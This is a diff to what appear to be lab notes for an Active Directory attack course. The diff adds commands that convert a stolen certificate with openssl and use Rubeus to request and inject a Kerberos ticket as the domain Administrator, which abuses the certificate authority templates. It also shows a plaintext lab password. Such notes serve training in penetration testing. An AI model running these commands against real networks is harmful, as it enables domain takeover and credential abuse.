@@ -954,5 +954,13 @@ Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template
 
 ![](https://i.imgur.com/RQFiyJK.png)
 
+```powershell
+C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -ex port -out C:\AD\Tools\esc1-EA.pfx
+```
 
 
+```powershell
+Rubeus.exe asktgt /user:moneycorp.local\Administrator
+/certificate:esc3user.pfx /dc:mcorp-dc.moneycorp.local
+/password:SecretPass@123 /ptt
+```
